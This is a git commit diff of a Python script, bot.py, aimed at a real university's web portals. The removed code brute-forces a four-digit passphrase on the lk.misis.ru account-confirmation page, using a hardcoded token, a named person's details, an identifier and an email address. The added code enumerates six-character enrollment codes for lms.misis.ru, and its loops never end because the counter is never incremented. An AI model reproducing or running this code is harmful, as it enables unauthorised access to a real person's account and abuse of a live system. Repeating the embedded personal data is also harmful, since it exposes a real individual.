5ee5ff53058c5a00ade32721d683d76605fe2c17
DaLLuZZ <79600653+DaLLuZZ@users.noreply.github.com>
2022-10-03 21:52:00 +0300

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,40 +1,42 @@
 import os
 import requests
 
+def GetNextChr(char):
+    if char == 57:
+        char = 65
+    elif char == 90:
+        char = 48
+    else:
+        char = char + 1
+    return char
+
+def bufGetNext(buffer):
+    i = 5
+    while i >= 0:
+        buffer[i] = GetNextChr(buffer[i])
+        if buffer[i] != 48:
+            break;
+    return buffer
+
 def main():
     client = requests.Session()
-    client = requests.get('https://lms.misis.ru/enroll/9ATXCY')
-    print(client.text)
-    course = ""
-    startpos = client.text.find("<title>Зарегистрироваться на ")
-    if startpos != -1:
-        print(startpos)
-        course = client.text[startpos+29:client.text.find("</title>")]
-        print(course)
-    return
+    buffer = [48, 48, 48, 48, 48, 48]
 
-    passport = 7500
-    while passport < 10000:
-        print("\n\n\n\n\n\npassport: {}\n".format(passport))
+    i = 0
+    while i < 500:
+        buffer = bufGetNext(buffer)
+        print("https://lms.misis.ru/enroll/{}{}{}{}{}{}".format(chr(buffer[0]), chr(buffer[1]), chr(buffer[2]), chr(buffer[3]), chr(buffer[4]), chr(buffer[5])))
+    
+#    client = requests.get("https://lms.misis.ru/enroll/{}".format())
 
-        body = ""
-        if passport < 10:
-            body = "utf8=%E2%9C%93&authenticity_token=uovKG5WinHeA%2FaOjnkPySJnc1YAjp2qmAqiT0pUK%2BiEEPg3sWdYsOJMsw0GTU9SnfLFQ2CheNXFBOx3T6yHFog%3D%3D&user%5Blast_name%5D=%D0%A1%D0%BE%D0%BA%D0%B0%D1%81%D1%8F%D0%BD&user%5Bfirst_name%5D=%D0%98%D1%80%D1%8D%D0%BD%D0%B0&user%5Bidentifier%5D=2107090&user%5Bpassphrase%5D=000{}&user%5Bverification_mail%5D=school3kzk%40yandex.ru&commit=%D0%90%D0%BA%D1%82%D0%B8%D0%B2%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D1%82%D1%8C".format(passport)
-        elif passport < 100:
-            body = "utf8=%E2%9C%93&authenticity_token=uovKG5WinHeA%2FaOjnkPySJnc1YAjp2qmAqiT0pUK%2BiEEPg3sWdYsOJMsw0GTU9SnfLFQ2CheNXFBOx3T6yHFog%3D%3D&user%5Blast_name%5D=%D0%A1%D0%BE%D0%BA%D0%B0%D1%81%D1%8F%D0%BD&user%5Bfirst_name%5D=%D0%98%D1%80%D1%8D%D0%BD%D0%B0&user%5Bidentifier%5D=2107090&user%5Bpassphrase%5D=00{}&user%5Bverification_mail%5D=school3kzk%40yandex.ru&commit=%D0%90%D0%BA%D1%82%D0%B8%D0%B2%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D1%82%D1%8C".format(passport)
-        elif passport < 1000:
-            body = "utf8=%E2%9C%93&authenticity_token=uovKG5WinHeA%2FaOjnkPySJnc1YAjp2qmAqiT0pUK%2BiEEPg3sWdYsOJMsw0GTU9SnfLFQ2CheNXFBOx3T6yHFog%3D%3D&user%5Blast_name%5D=%D0%A1%D0%BE%D0%BA%D0%B0%D1%81%D1%8F%D0%BD&user%5Bfirst_name%5D=%D0%98%D1%80%D1%8D%D0%BD%D0%B0&user%5Bidentifier%5D=2107090&user%5Bpassphrase%5D=0{}&user%5Bverification_mail%5D=school3kzk%40yandex.ru&commit=%D0%90%D0%BA%D1%82%D0%B8%D0%B2%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D1%82%D1%8C".format(passport)
-        elif passport < 10000:
-            body = "utf8=%E2%9C%93&authenticity_token=uovKG5WinHeA%2FaOjnkPySJnc1YAjp2qmAqiT0pUK%2BiEEPg3sWdYsOJMsw0GTU9SnfLFQ2CheNXFBOx3T6yHFog%3D%3D&user%5Blast_name%5D=%D0%A1%D0%BE%D0%BA%D0%B0%D1%81%D1%8F%D0%BD&user%5Bfirst_name%5D=%D0%98%D1%80%D1%8D%D0%BD%D0%B0&user%5Bidentifier%5D=2107090&user%5Bpassphrase%5D={}&user%5Bverification_mail%5D=school3kzk%40yandex.ru&commit=%D0%90%D0%BA%D1%82%D0%B8%D0%B2%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D1%82%D1%8C".format(passport)
 
-        client = requests.post('https://lk.misis.ru/ru/auth/confirm', body)
-        if client.text.find("К сожалению нам не удалось найти сотрудника") == -1 or passport < 1:
-            print(client.text)
-        if client.text.find("К сожалению нам не удалось найти сотрудника") == -1:
-            print("\n\nfinal passport: {}".format(passport))
-            break;
-
-        passport = passport + 1
+#    print(client.text)
+#    course = ""
+#    startpos = client.text.find("<title>Зарегистрироваться на ")
+#    if startpos != -1:
+#        print(startpos)
+#        course = client.text[startpos+29:client.text.find("</title>")]
+#        print(course)
 
 if __name__ == '__main__':
     main()
